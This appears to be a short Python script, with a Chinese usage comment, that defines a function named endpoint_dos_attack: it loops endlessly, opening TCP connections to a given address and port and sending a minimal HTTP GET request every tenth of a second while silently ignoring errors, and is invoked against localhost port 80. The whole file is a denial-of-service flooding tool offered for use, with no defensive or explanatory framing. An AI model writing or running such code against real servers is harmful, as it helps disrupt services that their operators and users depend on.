import socket
import time

def endpoint_dos_attack(target_ip, target_port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendall(b'GET / HTTP/1.1\r\n\r\n')
            sock.close()
        except:
            pass
        time.sleep(0.1)

# 使用方法
endpoint_dos_attack('127.0.0.1', 80)